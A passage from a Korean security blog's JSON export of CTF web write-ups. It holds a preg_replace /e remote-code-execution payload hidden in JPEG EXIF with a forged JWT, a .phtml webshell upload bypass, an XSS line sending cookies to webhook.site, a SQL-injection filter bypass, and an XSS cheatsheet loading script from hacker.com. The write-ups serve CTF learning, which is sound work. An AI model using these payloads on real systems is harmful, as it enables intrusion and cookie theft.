&quot;http://198.13.32.181:4345/index.php?key=tatadadazazaabccocoheheaaaaaaaaaaaaa&quot; r = requests.get(url, cookies=cookie2) print r.textdef main(): login(cookie1) login(cookie2) t1 = threading.Thread(target=times,args=()) t2 = threading.Thread(target=flag,args=()) t1.start() t2.start()main() Thank you (NGA) 2. (web) jpg viewer12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394&lt;?php session_start(); require_once __DIR__ . &#x27;/jwt.php&#x27;; if(!isset($_COOKIE[&#x27;PHPSESSJWT&#x27;]))&#123; $token = $jwt-&gt;hashing(array( &#x27;admin&#x27; =&gt; false, &#x27;iat&#x27; =&gt; time(), )); setcookie(&#x27;PHPSESSJWT&#x27;, $token, time() + 86400 * 30); &#125;?&gt; &lt;?php require_once __DIR__ . &#x27;/jwt.php&#x27;; $token = $_COOKIE[&#x27;PHPSESSJWT&#x27;]; if ($token) &#123; $body = $jwt-&gt;dehashing($token); &#125; if(isset($_GET[&#x27;source&#x27;]))&#123; echo highlight_file(__FILE__); exit; &#125; function imageanalyze($file)&#123; if(!is_file($file))&#123; echo &#x27;&lt;script&gt;alert(&quot;Where is the File?&quot;)&lt;/script&gt;&#x27;; exit; &#125; elseif(!exif_read_data($file))&#123; unlink($file); exit; &#125; else&#123; return exif_read_data($file); &#125; &#125; if(isset($_FILES[&#x27;JPG&#x27;]) &amp;&amp; $_FILES[&#x27;JPG&#x27;][&#x27;name&#x27;] != &quot;&quot;) &#123; $file = $_FILES[&#x27;JPG&#x27;]; $upload_directory = &#x27;./uploads/&#x27;; $ext_str = array(&quot;jpg&quot;); $max_file_size = 5242880; $ext = explode(&#x27;.&#x27;,$file[&#x27;name&#x27;]); $ext = strtolower(array_pop($ext)); if(!in_array($ext, $ext_str)) &#123; echo &quot;&lt;script&gt;alert(&#x27;jpg파일만 업로드 할 수 있습니다.&#x27;)&lt;/script&gt;&quot;; exit; &#125; if($file[&#x27;size&#x27;] &gt;= $max_file_size) &#123; echo &quot;&lt;script&gt;alert(&#x27;파일은 5MB 까지만 업로드 가능합니다.&#x27;)&lt;/script&gt;&quot;; exit; &#125; $path = $upload_directory.session_id(); $updir = $path.&#x27;/&#x27;.$file[&#x27;name&#x27;]; mkdir($path,0777); if(move_uploaded_file($file[&#x27;tmp_name&#x27;],$updir)) &#123; echo &quot;&lt;script&gt;alert(&#x27;파일 업로드 성공!&#x27;)&lt;/script&gt;&quot;; echo &quot;&lt;img src=&#x27;$updir&#x27;&gt;&quot;; $infor = imageanalyze($updir); &#125; else&#123; echo &quot;&lt;script&gt;alert(&#x27;업로드 에러!&#x27;)&lt;/script&gt;&quot;; exit; &#125; &#125; ?&gt; &lt;?php if(isset($infor))&#123; $Date = $infor[&#x27;DateTimeOriginal&#x27;]; $Model = $infor[&#x27;Model&#x27;]; $Make = $infor[&#x27;Make&#x27;]; $size = round($infor[&#x27;FileSize&#x27;]/1024,1); echo &quot;&lt;br&gt;파일명 : &#123;$infor[&#x27;FileName&#x27;]&#125;&lt;br&gt;&quot;; echo &quot;파일 크기 : &#123;$size&#125;KB&lt;br&gt;&quot;; if(array_key_exists(&#x27;DateTimeOriginal&#x27;,$infor))&#123; echo &quot;촬영 시간 : &#123;$Date&#125;&lt;br&gt;&quot;; &#125; else&#123; $date = date(&quot;Y-m-d H:i:s&quot;, $infor[&#x27;FileDateTime&#x27;]); echo &quot;업로드 시간 : &#123;$date&#125;&lt;br&gt;&quot;; &#125; if(array_key_exists(&#x27;Model&#x27;,$infor)&amp;&amp;isset($infor[&#x27;Model&#x27;]))&#123; echo &quot;카메라 모델 : &#123;$Model&#125;&lt;br&gt;&quot;; &#125; &#125; if($body[&#x27;admin&#x27;]==true)&#123; $edit = explode(&#x27;.&#x27;,$_COOKIE[&#x27;edit&#x27;]); preg_replace($$edit[0],$$edit[1],$$edit[2]); &#125; ?&gt; 이번에도 코드가 좀 길다, 한번 분석해보자. 1234if($body[&#x27;admin&#x27;]==true)&#123; $edit = explode(&#x27;.&#x27;,$_COOKIE[&#x27;edit&#x27;]); preg_replace($$edit[0],$$edit[1],$$edit[2]); &#125; 이 부분에 보면 쿠키 값의 admin이 true를 가질 때, edit의 쿠키를 가지고 preg_replace 함수의 인자로 사용한다. 처음엔 좀 생각 했는데, 검색 하다가 우연히 preg_replace 함수에 대해 RCE 문서를 찾을 수 있었다. 그렇다 이 문제도 동일한 취약점을 사용하고 있다. 1234$Date = $infor[&#x27;DateTimeOriginal&#x27;];$Model = $infor[&#x27;Model&#x27;];$Make = $infor[&#x27;Make&#x27;];$size = round($infor[&#x27;FileSize&#x27;]/1024,1); 이 부분에서 업로드 하는 jpg 파일의 사진 정보 값을 담고 출력 해주니, $model, $make 에 공격 페이로드를 넣고 admin 쿠키를 조작 해 preg_replace 함수로 흘러가게 해주면 된다. 세션 조작은 문제에서 만들어주는 형태와 동일하게 새 jwt 세션을 만들어서 바꿔주면 된다. (아래 참고) 12345678910&lt;?phprequire_once &quot;jwt.php&quot;;$jwt = new jwt();$token = $jwt-&gt;hashing(array( ‘admin’=&gt;’true’, ‘iat’=&gt;time()));var_dump($token);?&gt; Model=/a/e &amp; Make=eval(base64_decode(‘c3lzdGVtKCRfR0VUWydjbWQnXSk7’));?cmd=ls &amp; ?cmd=/flag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"}]},{"title":"ROP & SSE Instruction","slug":"rop-instruction-200210","date":"2020-02-09T15:00:00.000Z","updated":"2021-01-17T09:00:21.607Z","comments":true,"path":"2020/02/10/rop-instruction-200210/","link":"","permalink":"https://blog.jhyeon.dev/2020/02/10/rop-instruction-200210/","excerpt":"","text":"Linkhttps://www.notion.so/jhyeon/ROP-SSE-Instruction-ca573f7740ae4301ad61b455a140b659","categories":[{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/categories/Pwnable/"}],"tags":[{"name":"ROP","slug":"ROP","permalink":"https://blog.jhyeon.dev/tags/ROP/"}]},{"title":"DIMICTF 2019 Write up","slug":"dimictf-200206","date":"2020-02-05T15:00:00.000Z","updated":"2021-01-17T08:59:30.686Z","comments":true,"path":"2020/02/06/dimictf-200206/","link":"","permalink":"https://blog.jhyeon.dev/2020/02/06/dimictf-200206/","excerpt":"","text":"1. web(5shared)12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?phprequire_once &#x27;lib.php&#x27;;session_start();$session = md5(session_id());$uploaddir = __DIR__ . &quot;/~uploads/&#123;$session&#125;/&quot;;createDirectory(__DIR__ . &quot;/~uploads/&quot;);createDirectory($uploaddir);//print_r($_FILES[&#x27;file&#x27;]);$file = $_FILES[&#x27;file&#x27;];$uploadfile = $uploaddir . $file[&#x27;name&#x27;];// sanity check$extension = explode(&#x27;.&#x27;, $file[&#x27;name&#x27;])[1];if (!in_array($extension, Array(&quot;jpg&quot;, &quot;gif&quot;, &quot;png&quot;)))&#123; $message = &quot;&lt;script&gt;alert(&#x27;jpg, gif, png 확장자만 업로드할 수 있습니다.&#x27;); history.back(); &lt;/script&gt;&quot;; die($message);&#125;// the real sanity check$real_extension = array_pop(explode(&#x27;.&#x27;, $file[&#x27;name&#x27;]));if (preg_match(&quot;/php/i&quot;, $file[&#x27;name&#x27;]))&#123; $message = &quot;&lt;script&gt;alert(&#x27;파일 이름에 php가 들어가면 안됩니다.&#x27;); history.back(); &lt;/script&gt;&quot;; die($message);&#125;if ($file[&#x27;size&#x27;] &gt; 4096)&#123; $message = &quot;&lt;script&gt;alert(&#x27;최대 4mb까지 업로드할 수 있습니다.&#x27;); history.back(); &lt;/script&gt;&quot;; die($message);&#125;if (move_uploaded_file($file[&#x27;tmp_name&#x27;], $uploadfile))&#123; $message = &quot;&lt;script&gt;alert(&#x27;성공적으로 파일이 업로드되었습니다.&#x27;); location.href = &#x27;/&#x27;; &lt;/script&gt;&quot;; echo $message;&#125;else&#123; $message = &quot;&lt;script&gt;alert(&#x27;업로드 에러&#x27;); history.back(); &lt;/script&gt;&quot;; echo $message;&#125; 코드가 좀 긴편인데 주요 부분들만 한번 확인 해보자, 123456789101112131415// sanity check$extension = explode(&#x27;.&#x27;, $file[&#x27;name&#x27;])[1];if (!in_array($extension, Array(&quot;jpg&quot;, &quot;gif&quot;, &quot;png&quot;)))&#123; $message = &quot;&lt;script&gt;alert(&#x27;jpg, gif, png 확장자만 업로드할 수 있습니다.&#x27;); history.back(); &lt;/script&gt;&quot;; die($message);&#125;// the real sanity check$real_extension = array_pop(explode(&#x27;.&#x27;, $file[&#x27;name&#x27;]));if (preg_match(&quot;/php/i&quot;, $file[&#x27;name&#x27;]))&#123; $message = &quot;&lt;script&gt;alert(&#x27;파일 이름에 php가 들어가면 안됩니다.&#x27;); history.back(); &lt;/script&gt;&quot;; die($message);&#125; 웹쉘 업로드 문제이기 때문에 사실상 이 부분만 우회할 수 있다면 금방 풀 수 있다. sanity check 부분에 보면 argv[1] 로 오는 문자를 검사하는데,jpg, gif, png 만 허용시켜 둔 상황이다. 그런데 php에선 또 이상한 문제점이 우리를 반겨준다. 저렇게 검사할 경우에 다음과 같은 트릭을 사용할 수 있다. test.jpg test.jpg.phpjpg 뒤에 확장자를 하나 더 붙여서 실행 파일로 만들어 주면 확장자 검사를 피할 수 있다.근데 아래 real sanity check를 보면 php는 또 불가능 하기 때문에 php 대체 확장자를 써서 우회해주자. (phtml, php5 등) upload) test.jpg.phtml위와 같이 파일 명을 바꾸고, 웹 쉘을 업로드 시키면 된다. 2. (web) simple xss문제에 들어가면 게시판이 있는데 그냥 글쓰기 부분에서 xss payload 넣고,봇의 쿠키를 탈취하면 된다. 1location.href=&#x27;https://webhook.site/~&#x27;+document.cookie; 3. (web) simple sqli1234567891011121314151617181920212223242526272829303132333435&lt;?php //error_reporting(E_ALL); //ini_set(&quot;display_errors&quot;, 1); require &#x27;lib.php&#x27;; if (isset($_GET[&#x27;view-source&#x27;]))&#123; highlight_file(__FILE__); exit; &#125; $id = $_POST[&#x27;id&#x27;]; $pw = $_POST[&#x27;pw&#x27;]; //var_dump($conn); if (preg_match(&quot;/information|admin|or|\\=| |\\#|\\&#x27;|_|where/i&quot;, $id . $pw)) die(&quot;No Hack ~_~&quot;); if (isset($id, $pw)) &#123; $query = &quot;SELECT * FROM `users` WHERE `id` = trim(&#x27;&#123;$id&#125;&#x27;) AND `pw` = trim(&#x27;&#123;$pw&#125;&#x27;)&quot;; $result = mysqli_fetch_array(mysqli_query($conn, $query)); if ($result[&#x27;id&#x27;] === &#x27;admin&#x27;) echo &quot;&lt;h1&gt;&#123;$flag&#125;&lt;/h1&gt;&quot;; if ($result[&#x27;id&#x27;]) &#123; $message = &quot;&#123;$result[&#x27;id&#x27;]&#125;님 안녕하세요!&quot;; &#125; else &#123; $message = &quot;로그인에 실패하였습니다. 다시 시도해주세요.&quot;; &#125; &#125; ?&gt; 페이지 로그인 코드는 다음과 같다.$id, $pw 에 입력되는 값에서 information, admin, or 등 여러가지를 필터링 한다. 이 정규식 검증 부분들은 tab, like 문자를 통해서 쿼리문을 완성할 수 있다. 1id=\\&amp;pw=)|| id like &quot;ad&quot; &quot;min&quot;-- -","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"}]},{"title":"CTF Web Challenge(Dockerfile)","slug":"dockerfile-200205","date":"2020-02-04T15:00:00.000Z","updated":"2021-01-17T08:59:37.477Z","comments":true,"path":"2020/02/05/dockerfile-200205/","link":"","permalink":"https://blog.jhyeon.dev/2020/02/05/dockerfile-200205/","excerpt":"","text":"간단한 버전이라서 쓰는 사람에 맞게 적절히 수정하면 된다. 12345678910111213141516FROM ubuntu:18.04ENV DEBIAN_FRONTEND=noninteractiveENV TERM=linuxRUN apt-get update -yRUN apt-get install apache2 -yRUN apt-get install libapache2-mod-php -yRUN apt-get install php -yRUN apt-get install vim -yCOPY ./files /var/www/htmlRUN rm -rf /var/www/html/index.htmlEXPOSE 포트번호CMD [&quot;/usr/sbin/apache2ctl&quot;, &quot;-D&quot;, &quot;FOREGROUND&quot;]","categories":[{"name":"Docker","slug":"Docker","permalink":"https://blog.jhyeon.dev/categories/Docker/"}],"tags":[{"name":"Dockerfile","slug":"Dockerfile","permalink":"https://blog.jhyeon.dev/tags/Dockerfile/"}]},{"title":"libc database search(bluekat)","slug":"pwnbluekat-200205","date":"2020-02-04T15:00:00.000Z","updated":"2021-01-17T08:08:00.797Z","comments":true,"path":"2020/02/05/pwnbluekat-200205/","link":"","permalink":"https://blog.jhyeon.dev/2020/02/05/pwnbluekat-200205/","excerpt":"","text":"예전에 포너블 공부할 때 rop 문제에서 오프셋 기반으로립씨 버전 하나하나 찾으려니 솔직히 너무 귀찮았다.. 그래서 찾아보다가 libc bluekat 이라는 사이트를 찾았는데,함수 오프셋을 통해서 일치하는 libc 버전을 간단하게 찾아 주었다! 포너블 하신다면 자주 이용해먹으면 좋을 것 같다. [https://libc.blukat.me](libc-bluekat homepage)","categories":[{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/categories/Pwnable/"}],"tags":[{"name":"Tools","slug":"Tools","permalink":"https://blog.jhyeon.dev/tags/Tools/"}]},{"title":"xss cheatsheet 2020","slug":"xsscheatsheet-200205","date":"2020-02-04T15:00:00.000Z","updated":"2021-01-17T09:00:58.633Z","comments":true,"path":"2020/02/05/xsscheatsheet-200205/","link":"","permalink":"https://blog.jhyeon.dev/2020/02/05/xsscheatsheet-200205/","excerpt":"","text":"1234567891011121314151617&lt;script&gt;alert(1)&lt;/script&gt;&lt;Script&gt;alert(1)&lt;/Script&gt;&lt;svg onload=alert(1)&gt;&lt;img src=&quot;#&quot; onerror=alert(1)&gt;&lt;script src=&quot;hacker.com/hack.js&quot;&gt;&lt;/script&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;cilck me&lt;/a&gt;&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;&lt;embed src=&quot;javascript:alert(1)&quot;&gt;&lt;/embed&gt;&lt;body onload=&quot;alert(1);&quot;&gt;&lt;body onunload=&quot;alert(1);&quot;&gt;&quot;&gt;&lt;svg onload=alert(1)&gt;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; &lt;/style&gt;&lt;svg onload=alert(1)&gt; data:text/html,&lt;svg onload=alert(1)&gt; &lt;/script&gt;&lt;svg onload=alert(1)&gt; */alert(1)&lt;/script&gt;&lt;script&gt;/* constructor.constructor(&#x27;alert(/xss/)&#x27;)()&#125;&#125;","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/categories/Web/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://blog.jhyeon.dev/tags/XSS/"},{"name":"CheatSheet","slug":"CheatSheet","permalink":"https://blog.jhyeon.dev/tags/CheatSheet/"}]}],"categories":[{"name":"Wargame","slug":"Wargame","permalink":"https://blog.jhyeon.dev/categories/Wargame/"},{"name":"Memo","slug":"Memo","permalink":"https://blog.jhyeon.dev/categories/Memo/"},{"name":"Docker","slug":"Docker","permalink":"https://blog.jhyeon.dev/categories/Docker/"},{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/categories/Web/"},{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/categories/Pwnable/"},{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"},{"name":"websec.fr","slug":"websec-fr","permalink":"https://blog.jhyeon.dev/tags/websec-fr/"},{"name":"Writeup","slug":"Writeup","permalink":"https://blog.jhyeon.dev/tags/Writeup/"},{"name":"BoB","slug":"BoB","permalink":"https://blog.jhyeon.dev/tags/BoB/"},{"name":"Dockerfile","slug":"Dockerfile","permalink":"https://blog.jhyeon.dev/tags/Dockerfile/"},{"name":"JWT","slug":"JWT","permalink":"https://blog.jhyeon.dev/tags/JWT/"},{"name":"PHP","slug":"PHP","permalink":"https://blog.jhyeon.dev/tags/PHP/"},{"name":"Pwn","slug":"Pwn","permalink":"https://blog.jhyeon.dev/tags/Pwn/"},{"name":"Mprotect","slug":"Mprotect","permalink":"https://blog.jhyeon.dev/tags/Mprotect/"},{"name":"Shellcode","slug":"Shellcode","permalink":"https://blog.jhyeon.dev/tags/Shellcode/"},{"name":"Exploitation","slug":"Exploitation","permalink":"https://blog.jhyeon.dev/tags/Exploitation/"},{"name":"XSS","slug":"XSS","permalink":"https://blog.jhyeon.dev/tags/XSS/"},{"name":"ROP","slug":"ROP","permalink":"https://blog.jhyeon.dev/tags/ROP/"},{"name":"Tools","slug":"Tools","permalink":"https://blog.jhyeon.dev/tags/Tools/"},{"name":"CheatSheet","slug":"CheatSheet","permalink":"https://blog.jhyeon.dev/tags/CheatSheet/"}]}